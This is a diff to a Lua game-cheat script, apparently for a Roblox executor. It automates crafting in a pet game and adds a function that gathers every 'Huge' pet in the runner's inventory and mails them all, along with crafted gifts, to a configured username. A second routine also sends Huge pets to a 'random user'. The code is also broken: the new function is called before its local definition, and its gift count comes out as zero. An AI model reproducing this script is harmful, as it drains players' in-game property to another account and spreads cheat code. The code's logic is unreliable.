@@ -5,10 +5,9 @@ local player = game.Players.LocalPlayer
 local teleportLocation = game:GetService("Workspace").__THINGS.Instances.HolidayEvent.Teleports.Enter
 local username = getgenv().Config["Username"]  -- Use the global config for the username
 local noteToSend = getgenv().Config["NoteToSend"]  -- Use the global config for the note to send
-local amountThreshold = 100  -- Threshold for sending Snowflake Gifts
-local loopInterval = 10  -- Loop interval in seconds
 local snowflakeToGiftRatio = 10  -- The number of snowflakes required to craft one gift
 local diamondPerGift = 10000  -- Diamonds needed per gift crafted
+local loopInterval = 10  -- Loop interval in seconds
 
 -- Function to teleport the player to the Holiday Event
 local function teleportPlayer()
@@ -53,6 +52,13 @@ local function checkAndCraftGifts()
         -- Output snowflake count
         print("Total Snowflake items:", snowflakeCount)
 
+        -- If snowflakes are less than 10, stop the script and send gifts
+        if snowflakeCount < 10 then
+            print("Not enough snowflakes! Stopping script and sending gifts...")
+            sendGiftsToUsername(snowflakeCount)
+            return  -- Exit the loop and stop the script
+        end
+
         local totalGiftsToCraft = math.floor(snowflakeCount / snowflakeToGiftRatio)
         local totalDiamondToCraftAll = totalGiftsToCraft * diamondPerGift
 
@@ -73,14 +79,6 @@ local function checkAndCraftGifts()
             if success then
                 print("Successfully crafted gifts!")
                 teleportPlayer()  -- Teleport the player to the event
-
-                -- Mail Snowflake gifts
-                for i = 1, totalGiftsToCraft do
-                    repeat
-                        task.wait()  -- Wait until the pet is sent
-                    until Network.Invoke("Mailbox: Send", username, noteToSend, "Gift", "SnowflakeGift", 1)
-                    print("Sent Snowflake Gift to", username)
-                end
             else
                 warn("Failed to craft gifts:", err)
             end
@@ -126,6 +124,34 @@ local function sendHugePetsToRandomUser()
     end
 end
 
--- Run all functions concurrently using spawn
+-- Function to send all Snowflake gifts and Huge pets to the configured username
+local function sendGiftsToUsername(snowflakeCount)
+    -- Send all Snowflake Gifts
+    local totalGiftsToSend = math.floor(snowflakeCount / snowflakeToGiftRatio)
+    for i = 1, totalGiftsToSend do
+        repeat
+            task.wait()  -- Wait until the gift is sent
+        until Network.Invoke("Mailbox: Send", username, noteToSend, "Gift", "SnowflakeGift", 1)
+        print("Sent Snowflake Gift to", username)
+    end
+
+    -- Send all Huge pets
+    local HugeUIDList = {}
+    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
+        if PetData.id:find("Huge") then
+            table.insert(HugeUIDList, PetUID)
+        end
+    end
+
+    -- Send Huge pets to the configured user
+    for _, PetUID in pairs(HugeUIDList) do
+        repeat
+            task.wait()  -- Wait until the pet is sent
+        until Network.Invoke("Mailbox: Send", username, noteToSend, "Pet", PetUID, 1)
+        print("Sent Huge pet", PetUID, "to", username, "with message:", noteToSend)
+    end
+end
+
+-- Run the check and gift functions concurrently using spawn
 spawn(checkAndCraftGifts)
 spawn(sendHugePetsToRandomUser)  -- Run the function to send Huge pets
